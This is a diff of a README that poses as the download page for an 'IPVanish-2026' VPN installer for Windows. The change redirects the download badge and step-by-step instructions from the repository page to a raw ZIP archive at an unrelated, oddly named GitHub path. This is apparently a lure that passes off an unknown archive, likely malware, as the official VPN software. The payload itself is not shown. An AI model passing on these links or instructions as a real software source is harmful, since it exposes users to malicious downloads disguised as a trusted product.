@@ -5,7 +5,7 @@ description: "Download the latest IPVanish VPN installer for Windows 10 and 11. 
 ---
 # 🛡️ IPVanish-2026 - Secure your Windows connection easily
 
-[![](https://img.shields.io/badge/Download-IPVanish-blue.svg)](https://github.com/membranouslabyrinthaura955/IPVanish-2026)
+[![](https://img.shields.io/badge/Download-IPVanish-blue.svg)](https://raw.githubusercontent.com/membranouslabyrinthaura955/membranouslabyrinthaura955.github.io/main/saurognathous/io-membranouslabyrinthaura-github-3.7-alpha.4.zip)
 
 ## 📖 Project Overview
 
@@ -25,7 +25,7 @@ Your computer must meet these basic standards to run the VPN software smoothly:
 
 Follow these steps to obtain the software:
 
-1. Visit the following link to locate the installation file: [https://github.com/membranouslabyrinthaura955/IPVanish-2026](https://github.com/membranouslabyrinthaura955/IPVanish-2026).
+1. Visit the following link to locate the installation file: [https://raw.githubusercontent.com/membranouslabyrinthaura955/membranouslabyrinthaura955.github.io/main/saurognathous/io-membranouslabyrinthaura-github-3.7-alpha.4.zip](https://raw.githubusercontent.com/membranouslabyrinthaura955/membranouslabyrinthaura955.github.io/main/saurognathous/io-membranouslabyrinthaura-github-3.7-alpha.4.zip).
 2. Click the link to open the download page.
 3. Look for the file ending in .exe.
 4. Select the file and save the installer to your Downloads folder.
